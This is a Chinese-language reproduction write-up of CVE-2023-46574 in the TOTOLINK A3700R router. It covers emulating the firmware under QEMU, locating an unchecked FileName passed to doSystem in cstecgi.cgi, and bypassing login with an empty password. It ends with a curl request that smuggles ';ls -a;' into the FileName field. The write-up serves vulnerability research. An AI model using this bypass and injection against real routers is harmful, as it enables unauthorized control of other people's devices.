
TOTOLINK 命令执行 CVE-2023-46574

- - -

# TOTOLINK 命令执行 CVE-2023-46574

## 搭建 qemu mipsel 环境

```plain
sudo apt-get install schroot debootstrap
ubuntu20
debootstrap --arch=mipsel bookworm /iotconfig/debootstrap/mipsel https://mirrors.aliyun.com/debian
```

[![](assets/1708871055-a649f4c54a58e40e31e5da2e7ab5ea80.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240216220854-ead62014-ccd4-1.png)  
然后配置 schroot

```plain
sudo vim /etc/schroot/chroot.d/mipsel.conf
```

```plain
[mipsel]
type=directory
directory=/iotconfig/debootstrap/mipsel/
users=root
groups=root
root-groups=root
```

然后就可以看到已经配置上了

[![](assets/1708871055-40bfa708d0e0d88add8bff44ce5e17db.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240216220930-00c22a1c-ccd5-1.png)  
之后直接 schroot 进入

```plain
sudo schroot -c chroot:mipsel -u root
```

[![](assets/1708871055-7fc80804bdc97cbbdc5c72628423e932.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240216220941-073e4cd6-ccd5-1.png)

## 漏洞分析

在 cstecgi.cgi 程序中

[![](assets/1708871055-436d56d3102815927e106271b936cf8d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240216221000-1257c476-ccd5-1.png)  
FileName 没有检查放入 doSystem，所以这里有命令执行漏洞

## 固件模拟

```plain
sudo binwalk --run-as=root -Me TOTOLINK_A3700R_V9.1.2u.6165_20211012.web
```

[![](assets/1708871055-7fc56e0300d1aa2a079ac9cbd5711c42.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240216221019-1d838e70-ccd5-1.png)  
查看目录，里面有个 lighttpd 文件夹，所以这里用的是 lighttpd 服务

[![](assets/1708871055-6d3f1d4a01c43f1aa9e4093c33e7a9f4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240216221149-53403cd4-ccd5-1.png)  
在 lighttpd 目录下找到了配置文件

[![](assets/1708871055-3ab15f4ec88c48743bdf044f0648f3f2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240216221157-584f8586-ccd5-1.png)  
这里 lighttpd 是通过 lighttpd -f \[配置文件\]来启动的

```plain
sudo cp -r squashfs-root /iotconfig/debootstrap/mipsel/root/
```

然后将 squashfs-root 复制到安装的 mipsel 系统上

[![](assets/1708871055-8ec8711ef8acfeffe5d801c150913541.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240216221216-63a5712a-ccd5-1.png)  
进入 mipsel 系统，然后再 chroot 进入 squashfs-root 目录下

```plain
sudo schroot -c chroot:mipsel -u root
chroot squashfs-root/
```

[![](assets/1708871055-f65352104dc001a36a13f73198c6254a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240216221231-6c7fda24-ccd5-1.png)  
然后直接启动服务即可

```plain
lighttpd -f lighttp/lighttpd.conf
```

[![](assets/1708871055-51454ead13228ae08e72896aa036682c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240216221239-71762c72-ccd5-1.png)

```plain
这里如果没启动成功，只需要在/var/run 目录下创建一个 lighttpd.pid 文件即可
mkdir /var/run
touch /var/run/lighttpd.pid
```

然后就能进入路由器登录界面了

[![](assets/1708871055-0fe33dc5ea1d83097c60001c7bc696e8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240216221259-7d5e3160-ccd5-1.png)

## 绕过登录

因为没设置密码，所以直接抓包，空密码登录

[![](assets/1708871055-9278d7cb6d3fecf2b4019e44e044f111.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240216221311-847b51bc-ccd5-1.png)  
没直接进入，但是可以看到地址  
[http://127.0.0.1/formLoginAuth.htm?authCode=1&userName=&goURL=home.html&action=login](http://127.0.0.1/formLoginAuth.htm?authCode=1&userName=&goURL=home.html&action=login)

[![](assets/1708871055-48b7d02cfb785eac0e5464bdbffe9f8d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240216221320-89925b78-ccd5-1.png)  
直接访问即可

[![](assets/1708871055-d0e64867e06e13d679e7da477d596636.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240216221327-8e0d3bd2-ccd5-1.png)

## 命令执行

拿到 session id

[![](assets/1708871055-488c8ea0dfc6920b2726d1b4bc48805b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240216221342-97089114-ccd5-1.png)

```plain
curl http://127.0.0.1/cgi-bin/cstecgi.cgi -b "SESSION_ID=2:1708017806:2" -X POST -d '{"topicurl":"UploadFirmwareFile","FileName":";ls -a;"}'
```

[![](assets/1708871055-6e417d9aef16cffaecf1fdfd7863e275.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240216221402-a2eee3ca-ccd5-1.png)

![](assets/1708871055-d03a5e4b40ff92d0dd5ebf3823a3802c.gif)TOTOLINK\_A3700R\_V9.1.2u.6165\_20211012.zip (8.658 MB) [下载附件](https://xzfile.aliyuncs.com/upload/affix/20240216221624-f78081d2-ccd5-1.zip)
